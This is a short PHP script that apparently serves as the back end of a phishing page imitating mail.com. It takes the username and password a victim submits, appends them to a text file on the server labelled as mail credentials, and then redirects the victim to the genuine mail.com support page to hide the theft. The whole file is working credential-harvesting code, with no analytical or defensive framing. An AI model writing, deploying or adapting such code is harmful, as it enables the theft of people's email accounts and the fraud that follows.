<?php
file_put_contents("../usernames.txt", "Mail Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://support.mail.com#.7518-header-help1-1');
exit();
?>